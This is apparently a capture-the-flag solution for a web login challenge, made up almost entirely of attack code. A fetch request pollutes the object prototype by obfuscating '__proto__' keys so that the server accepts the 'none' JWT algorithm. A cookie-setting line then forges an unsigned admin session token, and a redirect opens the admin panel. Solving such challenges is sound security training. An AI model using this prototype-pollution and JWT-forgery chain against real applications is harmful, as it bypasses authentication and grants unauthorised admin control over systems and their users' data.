

Do a prototype pollution to affect code behavior.
```
fetch("/api/login", {
	"headers": {
		"content-type": "application/json",
	},
	"body": JSON.stringify({
		'auth.username' : 'thanos',
		'auth.password' : '123',
		'%%proto%%.algorithms' : ['none'],
		'%%proto%%.authKeyFile' : true
	}).replace(/%%/g,'__'),
	"method": "POST",
	"mode": "cors",
	"credentials": "omit"
});
```

Generate valid admin session with none algorithm
```
document.cookie = 'session=' + btoa(JSON.stringify({"alg":"none","typ":"JWT"})).replace(/=+$/,'') + '.' + btoa(JSON.stringify({"username":"admin","iat":Math.floor(new Date().getTime() / 1000)})).replace(/=+$/,'') + '.'
```

Redirect to panel
```
document.location.href = '/panel'
```
